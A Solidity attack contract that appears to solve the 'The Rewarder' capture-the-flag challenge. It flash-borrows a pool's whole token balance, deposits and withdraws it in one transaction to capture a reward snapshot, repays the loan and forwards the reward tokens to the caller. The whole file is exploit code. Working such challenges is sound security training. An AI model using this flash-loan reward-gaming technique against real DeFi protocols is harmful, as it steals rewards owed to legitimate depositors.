// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/AccountingToken.sol";
import "../DamnValuableToken.sol";

contract AttackTheRewarderPool {

  address rewarderPool;
  address flashLoanerPool;
  address token;
  address rewardToken;

  constructor(address _rewarderPool, address _flashLoanerPool, address _token, address _rewardToken) {
    rewarderPool = _rewarderPool;
    flashLoanerPool = _flashLoanerPool;
    token = _token;
    rewardToken = _rewardToken;
  }

  function attack() public {
    uint bal = DamnValuableToken(token).balanceOf(flashLoanerPool);
    FlashLoanerPool(flashLoanerPool).flashLoan(bal);
  }

  function receiveFlashLoan(uint amount) public {
    DamnValuableToken(token).approve(rewarderPool, amount);
    TheRewarderPool(rewarderPool).deposit(amount);
    TheRewarderPool(rewarderPool).withdraw(amount);
    DamnValuableToken(token).transfer(flashLoanerPool, amount);
  }

  function distributeRewards() public {
    TheRewarderPool(rewarderPool).distributeRewards();
    uint bal = RewardToken(rewardToken).balanceOf(address(this));
    RewardToken(rewardToken).transfer(msg.sender, bal);
  }

  receive() external payable {}
}